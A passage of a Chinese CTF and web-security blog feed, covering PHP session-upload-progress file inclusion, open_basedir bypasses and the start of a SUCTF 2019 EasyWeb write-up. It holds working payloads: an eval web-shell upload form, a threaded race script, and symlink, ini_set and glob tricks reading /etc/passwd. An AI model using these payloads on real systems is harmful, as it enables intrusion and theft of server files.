ï¼Œå®ƒçš„å­˜å‚¨è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­æŸ¥åˆ°</p><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.prefix</span> = <span class="hljs-string">&quot;upload_progress_&quot;</span><span class="hljs-attr">session.upload_progress.name</span> = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></code></pre><h5 id="é…ç½®"><a class="header-anchor" href="#é…ç½®">ğŸ­</a>é…ç½®</h5><pre><code class="hljs ini"><span class="hljs-attr">session.use_strict_mode</span>=<span class="hljs-literal">off</span>  <span class="hljs-comment">#cookieä¸­çš„sessionidå¯æ§</span><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">on</span><span class="hljs-attr">session.upload_progress.cleanup</span> = <span class="hljs-literal">on</span></code></pre><h5 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">ğŸ­</a>æ€è·¯</h5><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œå†å»åˆ©ç”¨ç«äº‰åœ¨sessionæ¸…ç©ºå‰åŒ…å«sessionæ–‡ä»¶ï¼Œè¾¾åˆ°Getshellçš„ç›®çš„</p><h5 id="é™åˆ¶"><a class="header-anchor" href="#é™åˆ¶">ğŸ­</a>é™åˆ¶</h5><p>å¦‚ä½•è·å–sessionçš„ä½ç½®ï¼šsession.use_strict_modeé»˜è®¤å€¼ä¸º0ï¼Œæ­¤æ—¶ç”¨æˆ·å¯ä»¥è‡ªå·±å®šä¹‰PHPSESSIDï¼Œå¹¶ä¸”PHPä¼šè‡ªåŠ¨åˆå§‹åŒ–sessionï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±session.upload_progress.prefixå’Œsession.upload_progress.nameç»„æˆï¼Œæœ€åè¢«å†™å…¥sessionæ–‡ä»¶é‡Œï¼Œè¯¥æ–‡ä»¶ä¿å­˜ä¸º/tmp/sess_PHPSESSID</p><h5 id="è§£é¢˜-v2"><a class="header-anchor" href="#è§£é¢˜-v2">ğŸ­</a>è§£é¢˜</h5><blockquote><p>æ–¹å¼ä¸€:</p><p>burpï¼Œåœ¨æœ¬åœ°ä¸Šä¼ ï¼Œç„¶åæŠ“åŒ…ï¼ŒåŠ ä¸€ä¸‹<code>PHPSESSID</code>ï¼Œçˆ†ç ´å®ƒçš„å€¼ï¼Œå°±å¯ä»¥RCE</p><p>upload.html:</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>æ–¹å¼äºŒï¼š</p><p>åˆ©ç”¨è„šæœ¬</p><pre><code class="hljs routeros">import ioimport requestsimport threadingsessid = <span class="hljs-string">&#x27;peri0d&#x27;</span>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125; def write(session):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)        resp = session.post( <span class="hljs-string">&#x27;http:xxx/&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;peri0d.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )def read(session):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        resp = session.post(<span class="hljs-string">&#x27;http:xxx/?file=/tmp/sess_&#x27;</span>+sessid,<span class="hljs-attribute">data</span>=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;peri0d.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:            <span class="hljs-builtin-name">print</span>(resp.text)                        event.clear()        <span class="hljs-keyword">else</span>:            <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;++++++++++++++++&#x27;</span>)<span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:    <span class="hljs-attribute">event</span>=threading.Event()    with requests.session() as session:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(1,30):             threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(1,30):            threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()    event.<span class="hljs-builtin-name">set</span>()</code></pre></blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_48537150/article/details/113189052">https://blog.csdn.net/weixin_48537150/article/details/113189052</a></p>]]></content>
    
    
    <categories>
      
      <category>require_onceåŒ…å«</category>
      
      <category>å›¾ç‰‡é©¬</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass open_basedir</title>
    <link href="/2021/08/17/open/"/>
    <url>/2021/08/17/open/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h2><h4 id="open-basedir"><a class="header-anchor" href="#open-basedir">ğŸ­</a>open_basedir</h4><p>open_basediræ˜¯phpçš„ä¸€ä¸ªé…ç½®,å®ƒå¯å°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸå¦‚<code>open_basedir=/var/www/html/:/tmp/</code>ï¼Œåˆ™ç”¨æˆ·æ— æ³•è·å–é™¤äº†/var/www/html/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚<em>ç”¨open_basediræŒ‡å®šçš„é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€,è€Œä¸æ˜¯ç›®å½•å</em>ã€‚è‹¥<code>open_basedir = /dir/user</code>, é‚£ä¹ˆç›®å½• <code>/dir/user</code>å’Œ<code>/dir/user1</code>éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ã€‚æ‰€ä»¥å¦‚æœè¦å°†è®¿é—®é™åˆ¶åœ¨ä»…ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œéœ€ç”¨æ–œçº¿ç»“æŸè·¯å¾„åã€‚</p><h4 id="ç¬¦å·é“¾æ¥"><a class="header-anchor" href="#ç¬¦å·é“¾æ¥">ğŸ­</a>ç¬¦å·é“¾æ¥</h4><p>ç¬¦å·é“¾æ¥åˆå«è½¯é“¾æ¥,æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„å(ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„)ã€‚è·¯å¾„å¯ä»¥æ˜¯ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥é“¾æ¥ä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ã€‚åœ¨å¯¹ç¬¦å·æ–‡ä»¶è¿›è¡Œè¯»æˆ–å†™æ“ä½œçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠè¯¥æ“ä½œè½¬æ¢ä¸ºå¯¹æºæ–‡ä»¶çš„æ“ä½œï¼Œä½†åˆ é™¤é“¾æ¥æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä»…ä»…åˆ é™¤é“¾æ¥æ–‡ä»¶ï¼Œè€Œä¸åˆ é™¤æºæ–‡ä»¶æœ¬èº«ã€‚</p><h2 id="ç»•è¿‡ï¼ˆlinuxï¼‰"><a class="header-anchor" href="#ç»•è¿‡ï¼ˆlinuxï¼‰">ğŸ­</a>ç»•è¿‡ï¼ˆlinuxï¼‰</h2><h4 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a class="header-anchor" href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°">ğŸ­</a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h4><p>open_basedirçš„è®¾ç½®å¯¹systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥è®¿é—®é™åˆ¶ç›®å½•ã€‚ä½†å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šè¢«é™åˆ¶åœ¨disable_functionå½“ä¸­ï¼Œæ‰€ä»¥ç”¨å¤„ä¸å¤§ã€‚</p><h4 id="symlink-å‡½æ•°"><a class="header-anchor" href="#symlink-å‡½æ•°">ğŸ­</a>symlink()å‡½æ•°</h4><blockquote><p>å»ºç«‹ç¬¦å·è¿æ¥</p> <pre><code class="hljs d">symlink(<span class="hljs-built_in">string</span> <span class="hljs-string">`$target`</span>, <span class="hljs-built_in">string</span> <span class="hljs-string">`$link`</span>): <span class="hljs-built_in">bool</span></code></pre><p><strong>symlink()</strong> å¯¹äºå·²æœ‰çš„ <code>target</code> å»ºç«‹ä¸€ä¸ªåä¸º <code>link</code> çš„ç¬¦å·è¿æ¥ã€‚target:è¿æ¥çš„ç›®æ ‡,link:è¿æ¥çš„åç§°.</p></blockquote><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>        mkdir(<span class="hljs-string">&quot;c&quot;</span>);        chdir(<span class="hljs-string">&quot;c&quot;</span>);        mkdir(<span class="hljs-string">&quot;d&quot;</span>);        chdir(<span class="hljs-string">&quot;d&quot;</span>);        chdir(<span class="hljs-string">&quot;..&quot;</span>);        chdir(<span class="hljs-string">&quot;..&quot;</span>);        symlink(<span class="hljs-string">&quot;c/d&quot;</span>,<span class="hljs-string">&quot;tmplink&quot;</span>);        symlink(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);        unlink(<span class="hljs-string">&quot;tmplink&quot;</span>);        mkdir(<span class="hljs-string">&quot;tmplink&quot;</span>);        <span class="hljs-keyword">echo</span> file_put_contents(<span class="hljs-string">&quot;http://127.0.0.1/exploit&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><h5 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">ğŸ­</a>åŸç†</h5><pre><code class="hljs less"><span class="hljs-selector-tag">symlink</span>(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);</code></pre><p>æ­¤æ—¶tmplinkè¿˜æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶ï¼Œå®ƒæŒ‡å‘çš„è·¯å¾„æ˜¯c/dï¼Œå› æ­¤exploitæŒ‡å‘çš„è·¯å¾„å°±å˜æˆäº†</p><pre><code class="hljs awk">c<span class="hljs-regexp">/d/</span>..<span class="hljs-regexp">/../</span><span class="hljs-number">1</span>.txt</code></pre><p>ç”±äºè¿™ä¸ªè·¯å¾„åœ¨open_basedirçš„èŒƒå›´ä¹‹å†…æ‰€ä»¥exploitæˆåŠŸå»ºç«‹äº†ã€‚ä¹‹åæˆ‘ä»¬åˆ é™¤tmplinkç¬¦å·é“¾æ¥æ–‡ä»¶å†æ–°å»ºä¸€ä¸ªåŒåä¸ºtmplinkçš„æ–‡ä»¶å¤¹ï¼Œè¿™æ—¶exploitæ‰€æŒ‡å‘çš„è·¯å¾„ä¸º</p><pre><code class="hljs awk">tmplink<span class="hljs-regexp">/../</span>../</code></pre><p>è¿™æ—¶å€™tmplinkå˜æˆäº†ä¸€ä¸ªçœŸå®å­˜åœ¨çš„æ–‡ä»¶å¤¹æ‰€ä»¥tmplink/â€¦/â€¦/å˜æˆäº†1.txtæ‰€åœ¨çš„ç›®å½•å³/var/www/ï¼Œç„¶åå†é€šè¿‡è®¿é—®ç¬¦å·é“¾æ¥æ–‡ä»¶exploitå³å¯ç›´æ¥è¯»å–åˆ°1.txtçš„æ–‡ä»¶å†…å®¹ã€‚</p><p>å¦ä¸€ç§åšæ³•ï¼š</p><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);symlink(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);symlink(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);unlink(<span class="hljs-string">&#x27;foo&#x27;</span>);symlink(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);</code></pre><h4 id="globä¼ªåè®®"><a class="header-anchor" href="#globä¼ªåè®®">ğŸ­</a>globä¼ªåè®®</h4><p>globæ˜¯phpè‡ª5.3.0ç‰ˆæœ¬èµ·å¼€å§‹ç”Ÿæ•ˆçš„ä¸€ä¸ªç”¨æ¥ç­›é€‰ç›®å½•çš„ä¼ªåè®®ï¼Œå®ƒåœ¨ç­›é€‰ç›®å½•æ—¶ä¸å—open_basedirçš„é™åˆ¶ã€‚</p><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>        $a = <span class="hljs-string">&quot;glob:///xxx/xxx/xxx/*.php&quot;</span>;        <span class="hljs-keyword">if</span> ( $b = opendir($a) ) &#123;                <span class="hljs-keyword">while</span> ( ($file = readdir($b)) !== <span class="hljs-literal">false</span> ) &#123;                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.$file.<span class="hljs-string">&quot;\n&quot;</span>;                &#125;                closedir($b);        &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>è¯»å–æŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰PHPæ–‡ä»¶</p><h4 id="åˆ©ç”¨DirectoryIterator-Glob-ç›´æ¥åˆ—ä¸¾ç›®å½•"><a class="header-anchor" href="#åˆ©ç”¨DirectoryIterator-Glob-ç›´æ¥åˆ—ä¸¾ç›®å½•">ğŸ­</a>åˆ©ç”¨DirectoryIterator + Glob ç›´æ¥åˆ—ä¸¾ç›®å½•</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$file_list = <span class="hljs-keyword">array</span>();<span class="hljs-comment">// normal files</span>$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;<span class="hljs-comment">// special files (starting with a dot(.))</span>$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;sort($file_list);<span class="hljs-keyword">foreach</span>($file_list <span class="hljs-keyword">as</span> $f)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h2 id="ini-set"><a class="header-anchor" href="#ini-set">ğŸ­</a>ini_set</h2><p>twiterä¸Šæœ‰ä¸€ä¸ªbypass open_basedirçš„æ–°æ–¹æ³• ã€‚<br>payload</p><pre><code class="hljs gams">&lt;?phpmkdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);chdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<span class="hljs-function"><span class="hljs-title">ini_set</span>(<span class="hljs-params">&#x27;open_basedir&#x27;,&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-meta"><span class="hljs-meta-keyword">$a</span>=file_get_contents(&#x27;flag&#x27;);</span>var_dump(<span class="hljs-symbol">$</span>a);?&gt;</code></pre><p>åˆ†æè¯¦è§ï¼š<a href="https://xz.aliyun.com/t/4720#toc-0">bypass open_basedirçš„æ–°æ–¹æ³•</a></p><h2 id="è¯»ç›®å½•"><a class="header-anchor" href="#è¯»ç›®å½•">ğŸ­</a>è¯»ç›®å½•</h2><p>å­¦ä¹ å¤§ä½¬çš„è„šæœ¬</p><h4 id="win"><a class="header-anchor" href="#win">ğŸ­</a>win</h4><h5 id="realpathåˆ—ä¸¾ç›®å½•"><a class="header-anchor" href="#realpathåˆ—ä¸¾ç›®å½•">ğŸ­</a>realpathåˆ—ä¸¾ç›®å½•</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;$file = <span class="hljs-string">&#x27;&#x27;</span>;$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;    realpath($file);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span><span class="hljs-function"></span>&#123;    $regexp = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;    preg_match($regexp, $errstr, $matches);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($matches[<span class="hljs-number">1</span>])) &#123;        printf(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, $matches[<span class="hljs-number">1</span>]);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h5 id="SplFileInfo-getRealPathåˆ—ä¸¾ç›®å½•"><a class="header-anchor" href="#SplFileInfo-getRealPathåˆ—ä¸¾ç›®å½•">ğŸ­</a>SplFileInfo::getRealPathåˆ—ä¸¾ç›®å½•</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$basedir = <span class="hljs-string">&#x27;D:/test/&#x27;</span>;$arr = <span class="hljs-keyword">array</span>();$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $info = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>($basedir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>);    $re = $info-&gt;getRealPath();    <span class="hljs-keyword">if</span> ($re) &#123;        dump($re);    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dump</span>(<span class="hljs-params">$s</span>)</span>&#123;    <span class="hljs-keyword">echo</span> $s . <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;    ob_flush();    flush();&#125;<span class="hljs-meta">?&gt;</span></code></pre><h5 id="GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•"><a class="header-anchor" href="#GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•">ğŸ­</a>GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;$file = <span class="hljs-string">&#x27;&#x27;</span>;$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;    <span class="hljs-comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>    <span class="hljs-comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span>    imageftbbox(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, $file, <span class="hljs-string">&#x27;aaa&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">global</span> $file;    <span class="hljs-keyword">if</span> (stripos($errstr, <span class="hljs-string">&#x27;Invalid font filename&#x27;</span>) === <span class="hljs-literal">FALSE</span>) &#123;        printf(<span class="hljs-string">&quot;%s&lt;br/&gt;&quot;</span>, $file);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="Linux"><a class="header-anchor" href="#Linux">ğŸ­</a>Linux</h4><h5 id="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"><a class="header-anchor" href="#bindtextdomainæš´åŠ›çŒœè§£ç›®å½•">ğŸ­</a>bindtextdomainæš´åŠ›çŒœè§£ç›®å½•</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$re = bindtextdomain(<span class="hljs-string">&#x27;xxx&#x27;</span>, $_GET[<span class="hljs-string">&#x27;dir&#x27;</span>]);var_dump($re);<span class="hljs-meta">?&gt;</span></code></pre><p>dirä¼ å…¥çš„å‚æ•°æ˜¯ç›®å½•ï¼Œå¦‚æœç›®å½•å­˜åœ¨ï¼Œå°±è¿”å›ç›®å½•è·¯å¾„ï¼Œä¸å­˜åœ¨å°±è¿”å›bool(false)ï¼Œç”¨äºæš´åŠ›çŒœè§£ç›®å½•ã€‚</p><h2 id="SUCTF-2019-EasyWeb"><a class="header-anchor" href="#SUCTF-2019-EasyWeb">ğŸ­</a>[SUCTF 2019]EasyWeb</h2><p>é¢˜ç›®ç»™äº†æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span>    $userdir = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">if</span>(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&quot;file&quot;</span>]))&#123;        $tmp_name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];        $name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];        $extension = substr($name, strrpos($name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         $path= $userdir.<span class="hljs-string">&quot;/&quot;</span>.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-keyword">if</span> (!$hhh)&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">if</span>(strlen($hhh)&gt;<span class="hljs-number">18</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);$character_type = count_chars($hhh, <span class="hljs-number">3</span>);<span class="hljs-keyword">if</span>(strlen($character_type)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<span class="hljs-keyword">eval</span>($hhh);<span class="hljs-meta">?&gt;</span></code></pre><p>å…ˆçœ‹get_the_flag()ï¼š</p><p>è¿‡æ»¤äº†æ–‡ä»¶åç¼€ï¼Œä¸èƒ½å‡ºç°â€œphâ€ï¼Œä¸Šä¼ å›¾ç‰‡é©¬é…åˆ .htaccess å³å¯ï¼Œä¸” exif_imagetype  